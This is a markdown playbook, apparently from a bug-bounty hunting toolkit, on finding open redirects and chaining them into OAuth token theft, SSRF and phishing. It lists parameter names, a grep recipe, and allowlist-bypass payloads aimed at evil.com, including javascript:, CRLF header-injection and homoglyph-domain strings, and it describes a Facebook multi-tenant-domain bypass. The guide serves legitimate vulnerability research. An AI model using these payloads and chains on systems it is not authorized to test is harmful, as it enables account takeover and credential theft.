# Moraa — Open redirect (hunt it as an ATO chain)

> Load when a param controls a redirect. Alone it's Low; its value is as a **chain primitive** —
> OAuth `code`/token theft, SSRF filter bypass, cookie/token leak via Referer. Report standalone only
> if it lands on a sensitive flow.

## Find the sink
```
params: redirect, redirect_uri, redirect_url, url, next, returnUrl, return, continue, dest,
        destination, go, goto, target, r, u, link, out, callback, forward, ref, back, returnTo,
        checkout_url, success_url, cancel_url, image_url, login_redirect, path
# from JS: js-analysis.md §4 (location.href/replace/assign, window.open sinks)
grep -rhoiE '(redirect|return|next|url|dest|continue|goto|callback)=' recon/urls.txt | sort -u
```

## Payloads (bypass "must be same-site" checks)
```
https://evil.com                      //evil.com                 //evil.com/%2e%2e
/\evil.com          /\/evil.com       \/\/evil.com               https:evil.com
https://T@evil.com                    https://evil.com%23@T      https://evil.com%2f%2f
//evil.com/%2f..    ///evil.com       ////evil.com               https://evil.com/.T.com
https://T.evil.com  https://evilT.com (suffix/prefix allowlist flaws)
http://evil.com#T.com   ?next=https://evil.com   whitelisted-host.evil.com
javascript:alert(1)  data:text/html,... (if it hits location and browser allows → DOM XSS)
CRLF: /%0d%0aLocation:%20https://evil.com (header injection → response splitting)
https://legіt.com (Cyrillic і U+0456 lookalike, punycode-registered) — passes string-equality
allowlist checks that compare the rendered/visual domain, not the underlying punycode
```

## Domain check is correct, but is the domain itself multi-tenant?
(ysamm.com "leaking-fxauth-token", FB, Jan 2026). Not every redirect bug is an allowlist-regex
flaw. FB's check accepted any `*.facebook.com`-family host — a correct, working domain match;
none of the payload tricks above apply.
```
The flaw: the trusted domain itself hosts multi-tenant, third-party-claimable PATHS.
apps.facebook.com/{app_namespace} — any registered platform app claims an execution context
under facebook.com.
- attacker registers a platform app → their own apps.facebook.com/{their_namespace}
- that URL passes the "is it a facebook.com domain" allowlist check perfectly legitimately
- ...while actually serving attacker-controlled content
```

**Lesson: before trusting `*.platform-domain.com` (or an exact-match single domain) as a safe
redirect_uri/postMessage-origin/base-URI allowlist entry, check whether that domain itself lets
third parties register their own content under a path or subdomain of it — app marketplaces
(`platform.com/apps/{id}`), user/page profile URLs (`platform.com/u/{username}`), docs/wiki sites
with public edit, file-sharing services, URL shorteners run by the platform itself, etc. A
domain-scoped allowlist is not safe against a domain that is itself multi-tenant, even when the
domain-matching LOGIC has no bug at all.** (Same trick answers "where do I get an origin under the
trusted domain?" in `cors.md` §2/§4 — same-site cookie escape.)

## Chains (why it matters)
```
OAuth: redirect_uri=<open-redirect-on-trusted-host> → victim code/token → attacker → ATO (auth-oauth.md)
SSRF:  server-side follower validates first URL, redirect sends it to 169.254.169.254 (ssrf.md)
Token leak: redirect carries auth token/session in URL/fragment → lands on attacker → Referer leak
Phishing: on a trusted domain → credential harvest (report if login/OAuth involved)
```

## Impact gate — name what follows the redirect, or drop it

Open redirect alone is on the always-rejected list: **a claim needs a named asset that travels
the redirect to a host the attacker controls.** The falsifier:

- Point the redirect at YOUR collaborator and show what arrives — an OAuth `code`/token
  (`redirect_uri=` context), a session/token in URL or Referer, or nothing. **Nothing arriving =
  no theft vector = the validate.md kill-signal row** ("pure redirect has no theft vector").
  Downgrade to a LEAD naming the candidate chain — do not write a finding.
- The one standalone carve-out this doc grants: the redirect lands on a sensitive flow (login /
  OAuth consent) on a trusted domain — and even then [[validate]]'s Q2 (no unusual victim
  action) kills most phishing-only reports.
- Redirect-to-own-domain reflections and a `javascript:` sink you never saw navigate are the
  noise this gate exists to bury.

## Method
Confirm the redirect leaves the origin (`Location:` to evil / browser navigates away). Then find the
flow that makes it matter (OAuth/token/SSRF). → `validate.md`; report with the chain, not just "it redirects".
